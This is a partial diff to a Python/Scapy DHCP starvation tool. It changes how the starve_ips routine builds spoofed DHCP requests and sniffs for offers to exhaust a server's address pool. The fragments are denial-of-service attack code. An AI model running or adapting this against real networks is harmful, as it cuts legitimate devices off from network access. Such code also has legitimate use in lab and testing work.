@@ -115,7 +115,7 @@ def dhcp_request( ip : str, device_mac : str, transaction_id : hex, server_ip : 
     request_packet = Ether(dst=ETHER_BROADCAST, src=device_mac, type=ETHER_TYPES.IPv4)\
                     / IP(dst=IP_GLOBAL_BROADCAST,src='0.0.0.0',ttl=args.ttl)\
                     / UDP(dport=DHCP_ATTS.SERVER_PORT,sport=DHCP_ATTS.CLIENT_PORT)\
-                    / BOOTP(htype = BOOTP_ATTS.HTYPE.ETHERNET, op = BOOTP_ATTS.OP_CODE.BOOTREQUEST, chaddr=mac_to_binary(device_mac), hops = 2, xid = transaction_id)\
+                    / BOOTP(htype = BOOTP_ATTS.HTYPE.ETHERNET, op = BOOTP_ATTS.OP_CODE.BOOTREQUEST, chaddr=mac_to_binary(device_mac), xid = transaction_id)\
                     / DHCP(options=dhcp_options)
     logger.info(f"{function_name} : sending dhcp request for {ip} to {server_ip}, via {interface}")
     sendp(request_packet, iface=interface)
@@ -175,7 +175,7 @@ def is_my_dhcp_offer(packet, my_mac : str)->bool:
     return my_mac in packet[BOOTP].chaddr
         
 
-def capture_my_dhcp_offer(dest_mac : str, server_mac : str, interface : str = conf.iface , result_list = None):
+def capture_my_dhcp_offer(dest_mac : str, interface : str = conf.iface , result_list = None):
     """
     Gets a MAC and server IP
     tries to Capture DHCP responses for the provided MAC
@@ -185,12 +185,13 @@ def capture_my_dhcp_offer(dest_mac : str, server_mac : str, interface : str = co
 
     logger.info(f"{function_name} : sniffing on interface {interface} for dhcp offers for {dest_mac}")
     
-    res = sniff(count=1, filter = f"udp and ether src {server_mac}", timeout=4, iface=args.sniff_interface,\
+    res = sniff(count=1, filter = f"udp and src port {DHCP_ATTS.SERVER_PORT} and dst port {DHCP_ATTS.CLIENT_PORT}", timeout=4, iface=args.sniff_interface,\
             lfilter= lambda packet : is_my_dhcp_offer(packet, dest_mac))
 
     if len(res) != 0:
         result_list[0] = res[0]
-
+        result_list.append(res[0][Ether].src)
+        logger.debug(f"function_name : captured offer for {dest_mac} from {result_list[1]}")
     
     if len(res) != 0 : logger.info(f"{function_name} : captured {res}")
     else : logger.warning(f"{function_name} : returning None")
@@ -311,7 +312,7 @@ def starve_ips( server_ip : str, server_mac : str , interface : str = conf.iface
 
         offer = [None]
         
-        sniff_thread = threading.Thread(target=capture_my_dhcp_offer, args=[temp_mac, server_mac, sniff_interface ,offer])
+        sniff_thread = threading.Thread(target=capture_my_dhcp_offer, args=[temp_mac, sniff_interface ,offer])
         sniff_thread.start()
         
         time.sleep(0.2)
